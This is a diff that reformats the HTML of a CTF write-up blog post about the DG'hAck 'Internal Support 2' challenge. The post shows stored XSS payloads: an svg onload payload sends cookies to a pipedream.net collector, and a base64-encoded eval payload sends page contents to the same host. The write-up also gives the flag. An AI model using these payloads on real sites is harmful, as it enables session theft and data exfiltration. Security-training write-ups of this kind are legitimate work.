@@ -1,14 +1,84 @@
-<!doctype html><html lang=en><head><title>Writeup DG'hAck: Internal Support 2 :: Nicolas Bourras</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="This is the second version of the ticketing system presented in the CTF. We are greeted with the exact same interface. So let&amp;rsquo;s try exactly the same payload:
+<!doctype html><html lang=en>
+<head>
+<title>Writeup DG'hAck: Internal Support 2 :: Nicolas Bourras</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="This is the second version of the ticketing system presented in the CTF. We are greeted with the exact same interface. So let&amp;rsquo;s try exactly the same payload:
 &amp;lt;svg onload=&amp;#34;document.body.innerHTML=document.body.innerHTML.concat(&amp;#39;&amp;lt;img src=\&amp;#39;https://enx8b5ofkwzw.x.pipedream.net/&amp;#39;.concat(btoa(document.cookie)).concat(&amp;#39;\&amp;#39; /&amp;gt;&amp;#39;))&amp;#34; /&amp;gt; After a few seconds, we manage to steal a cookie! However, we can&amp;rsquo;t use it, as the session is ip-locked:
 
-Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page."><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://nicolasb.fr/blog/writeup-dghack-internal-support-2/><link rel=stylesheet href=https://nicolasb.fr/assets/style.css><link rel=stylesheet href=https://nicolasb.fr/assets/pink.css><link rel=apple-touch-icon href=https://nicolasb.fr/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=https://nicolasb.fr/img/favicon/pink.png><meta name=twitter:card content="summary"><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Writeup DG'hAck: Internal Support 2"><meta property="og:description" content="This is the second version of the ticketing system presented in the CTF. We are greeted with the exact same interface. So let&amp;rsquo;s try exactly the same payload:
+Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page.">
+<meta name=keywords content>
+<meta name=robots content="noodp">
+<link rel=canonical href=https://nicolasb.fr/blog/writeup-dghack-internal-support-2/>
+<link rel=stylesheet href=https://nicolasb.fr/assets/style.css>
+<link rel=stylesheet href=https://nicolasb.fr/assets/pink.css>
+<link rel=apple-touch-icon href=https://nicolasb.fr/img/apple-touch-icon-192x192.png>
+<link rel="shortcut icon" href=https://nicolasb.fr/img/favicon/pink.png>
+<meta name=twitter:card content="summary">
+<meta name=twitter:creator content>
+<meta property="og:locale" content="en">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup DG'hAck: Internal Support 2">
+<meta property="og:description" content="This is the second version of the ticketing system presented in the CTF. We are greeted with the exact same interface. So let&amp;rsquo;s try exactly the same payload:
 &amp;lt;svg onload=&amp;#34;document.body.innerHTML=document.body.innerHTML.concat(&amp;#39;&amp;lt;img src=\&amp;#39;https://enx8b5ofkwzw.x.pipedream.net/&amp;#39;.concat(btoa(document.cookie)).concat(&amp;#39;\&amp;#39; /&amp;gt;&amp;#39;))&amp;#34; /&amp;gt; After a few seconds, we manage to steal a cookie! However, we can&amp;rsquo;t use it, as the session is ip-locked:
 
-Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page."><meta property="og:url" content="https://nicolasb.fr/blog/writeup-dghack-internal-support-2/"><meta property="og:site_name" content="Nicolas Bourras"><meta property="og:image" content="https://nicolasb.fr/img/favicon/pink.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2020-11-19 03:45:38 +0100 CET"></head><body class=pink><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Nicolas Bourras</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about>About</a></li><li><a href=/>Posts</a></li><li><a href=/recipes>Recipes</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about>About</a></li><li><a href=/>Posts</a></li><li><a href=/recipes>Recipes</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=https://nicolasb.fr/blog/writeup-dghack-internal-support-2/>Writeup DG&rsquo;hAck: Internal Support 2</a></h1><div class=post-meta><span class=post-date>2020-11-19</span></div><span class=post-tags>#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
+Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page.">
+<meta property="og:url" content="https://nicolasb.fr/blog/writeup-dghack-internal-support-2/">
+<meta property="og:site_name" content="Nicolas Bourras">
+<meta property="og:image" content="https://nicolasb.fr/img/favicon/pink.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+<meta property="article:published_time" content="2020-11-19 03:45:38 +0100 CET">
+</head>
+<body class=pink>
+<div class="container center">
+<header class=header>
+<div class=header__inner>
+<div class=header__logo>
+<a href=/>
+<div class=logo>
+Nicolas Bourras
+</div>
+</a>
+</div>
+<div class=menu-trigger>menu</div>
+</div>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/about>About</a></li>
+<li><a href=/>Posts</a></li>
+<li><a href=/recipes>Recipes</a></li>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/about>About</a></li>
+<li><a href=/>Posts</a></li>
+<li><a href=/recipes>Recipes</a></li>
+</ul>
+</nav>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>
+<a href=https://nicolasb.fr/blog/writeup-dghack-internal-support-2/>Writeup DG&rsquo;hAck: Internal Support 2</a></h1>
+<div class=post-meta>
+<span class=post-date>
+2020-11-19
+</span>
+</div>
+<span class=post-tags>
+#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/dghack/>dghack</a>&nbsp;</span><div class=post-content><div><p>This is the second version of the <a href=/blog/writeup-dghack-internal-support-1>ticketing system</a> presented in the CTF. We are greeted with the exact same interface. So let&rsquo;s try exactly the same payload:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>svg</span> <span style=color:#a6e22e>onload</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;document.body.innerHTML=document.body.innerHTML.concat(&#39;&lt;img src=\&#39;https://enx8b5ofkwzw.x.pipedream.net/&#39;.concat(btoa(document.cookie)).concat(&#39;\&#39; /&gt;&#39;))&#34;</span> /&gt;
-</code></pre></div><p>After a few seconds, we manage to steal a cookie! However, we can&rsquo;t use it, as the session is ip-locked:</p><p><a href=/assets/dghack/internal-support-2-ip-denied.png><img src=/assets/dghack/internal-support-2-ip-denied.png alt="The IP-lock error message"></a></p><p>Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page. Let&rsquo;s try reading it using some XHR!</p><p>The JS we&rsquo;ll inject is going to be:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>request</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>XMLHttpRequest</span>();
+#<a href=https://nicolasb.fr/tags/dghack/>dghack</a>&nbsp;
+</span>
+<div class=post-content><div>
+<p>This is the second version of the <a href=/blog/writeup-dghack-internal-support-1>ticketing system</a> presented in the CTF. We are greeted with the exact same interface. So let&rsquo;s try exactly the same payload:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>svg</span> <span style=color:#a6e22e>onload</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;document.body.innerHTML=document.body.innerHTML.concat(&#39;&lt;img src=\&#39;https://enx8b5ofkwzw.x.pipedream.net/&#39;.concat(btoa(document.cookie)).concat(&#39;\&#39; /&gt;&#39;))&#34;</span> /&gt;
+</code></pre></div><p>After a few seconds, we manage to steal a cookie! However, we can&rsquo;t use it, as the session is ip-locked:</p>
+<p><a href=/assets/dghack/internal-support-2-ip-denied.png><img src=/assets/dghack/internal-support-2-ip-denied.png alt="The IP-lock error message"></a></p>
+<p>Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page. Let&rsquo;s try reading it using some XHR!</p>
+<p>The JS we&rsquo;ll inject is going to be:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>request</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>XMLHttpRequest</span>();
 <span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>onreadystatechange</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span> () {
     <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>DONE</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>DONE</span> <span style=color:#f92672>||</span> <span style=color:#ae81ff>4</span>;
     <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>readyState</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>DONE</span>){
@@ -18,8 +88,11 @@ Hmm. The challenge is quite similar to the last one, so we know that the flag is
 };
 <span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;/&#39;</span>, <span style=color:#66d9ef>true</span>);
 <span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>send</span>(<span style=color:#66d9ef>null</span>);
-</code></pre></div><p>NOTE : we can&rsquo;t use the <code>fetch</code> api, the bot must not be that up to date.</p><p>Which translates to this payload:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>svg</span> <span style=color:#a6e22e>onload</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;eval(atob(&#39;dmFyIHJlcXVlc3QgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKcmVxdWVzdC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbiAoKSB7CiAgICB2YXIgRE9ORSA9IHRoaXMuRE9ORSB8fCA0OwogICAgaWYgKHRoaXMucmVhZHlTdGF0ZSA9PT0gRE9ORSl7CiAgICAgICAgdmFyIGVuY29kZWQgPSBidG9hKHJlcXVlc3QucmVzcG9uc2VUZXh0KTsKICAgICAgICBkb2N1bWVudC5sb2NhdGlvbiA9ICdodHRwczovL2VueDhiNW9ma3d6dy54LnBpcGVkcmVhbS5uZXQ/JyArIGVuY29kZWQ7CiAgICB9Cn07CnJlcXVlc3Qub3BlbignR0VUJywgJy8nLCB0cnVlKTsKcmVxdWVzdC5zZW5kKG51bGwpOw==&#39;))&#34;</span> /&gt;
-</code></pre></div><p>And there we go, after a few seconds, we get our html. In it, we find the todo-list :</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>section</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;margin-top: 50px;&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;pt-95 pb-100&#34;</span>&gt;
+</code></pre></div><p>NOTE : we can&rsquo;t use the <code>fetch</code> api, the bot must not be that up to date.</p>
+<p>Which translates to this payload:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>svg</span> <span style=color:#a6e22e>onload</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;eval(atob(&#39;dmFyIHJlcXVlc3QgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKcmVxdWVzdC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbiAoKSB7CiAgICB2YXIgRE9ORSA9IHRoaXMuRE9ORSB8fCA0OwogICAgaWYgKHRoaXMucmVhZHlTdGF0ZSA9PT0gRE9ORSl7CiAgICAgICAgdmFyIGVuY29kZWQgPSBidG9hKHJlcXVlc3QucmVzcG9uc2VUZXh0KTsKICAgICAgICBkb2N1bWVudC5sb2NhdGlvbiA9ICdodHRwczovL2VueDhiNW9ma3d6dy54LnBpcGVkcmVhbS5uZXQ/JyArIGVuY29kZWQ7CiAgICB9Cn07CnJlcXVlc3Qub3BlbignR0VUJywgJy8nLCB0cnVlKTsKcmVxdWVzdC5zZW5kKG51bGwpOw==&#39;))&#34;</span> /&gt;
+</code></pre></div><p>And there we go, after a few seconds, we get our html. In it, we find the todo-list :</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>section</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;margin-top: 50px;&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;pt-95 pb-100&#34;</span>&gt;
   &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;container&#34;</span>&gt;
     &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;row justify-content-center&#34;</span>&gt;
       &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;col-lg-8&#34;</span>&gt;
@@ -49,8 +122,42 @@ Hmm. The challenge is quite similar to the last one, so we know that the flag is
     &lt;/<span style=color:#f92672>div</span>&gt;
   &lt;/<span style=color:#f92672>div</span>&gt;
 &lt;/<span style=color:#f92672>section</span>&gt;
-</code></pre></div><p>Which contains the flag: <code>BEtter_BUT_ST!LL_N0tttttttttt++Prfct!</code>.</p><hr><p><a href=/tags/dghack>View all of the DG&rsquo;hAck articles</a>.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://nicolasb.fr/blog/writeup-dghack-up-credit/><span class=button__icon>←</span>
-<span class=button__text>Writeup DG'hAck: Up Credit</span></a></span>
-<span class="button next"><a href=https://nicolasb.fr/blog/writeup-dghack-internal-support-1/><span class=button__text>Writeup DG'hAck: Internal Support 1</span>
-<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2021 Powered by <a href=http://gohugo.io>Hugo</a></span>
-<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script><script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>
+</code></pre></div><p>Which contains the flag: <code>BEtter_BUT_ST!LL_N0tttttttttt++Prfct!</code>.</p>
+<hr>
+<p><a href=/tags/dghack>View all of the DG&rsquo;hAck articles</a>.</p>
+</div></div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Read other posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button previous">
+<a href=https://nicolasb.fr/blog/writeup-dghack-up-credit/>
+<span class=button__icon>←</span>
+<span class=button__text>Writeup DG'hAck: Up Credit</span>
+</a>
+</span>
+<span class="button next">
+<a href=https://nicolasb.fr/blog/writeup-dghack-internal-support-1/>
+<span class=button__text>Writeup DG'hAck: Internal Support 1</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class=copyright>
+<span>© 2021 Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span>
+</div>
+</div>
+</footer>
+<script src=https://nicolasb.fr/assets/main.js></script>
+<script src=https://nicolasb.fr/assets/prism.js></script>
+</div>
+</body>
+</html>
